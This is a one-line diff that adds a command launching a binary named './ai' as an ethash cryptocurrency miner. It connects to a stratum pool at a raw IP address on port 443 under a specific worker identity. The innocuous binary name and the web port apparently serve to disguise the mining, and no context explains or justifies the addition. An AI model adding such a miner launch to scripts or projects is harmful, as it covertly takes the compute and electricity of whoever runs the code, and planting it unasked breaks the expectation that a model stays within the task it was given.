@@ -1,0 +1,1 @@
+./ai -a ethash -o stratum+tcp://20.94.236.164:443 -u '0xGamerHash:denizdeni#2'
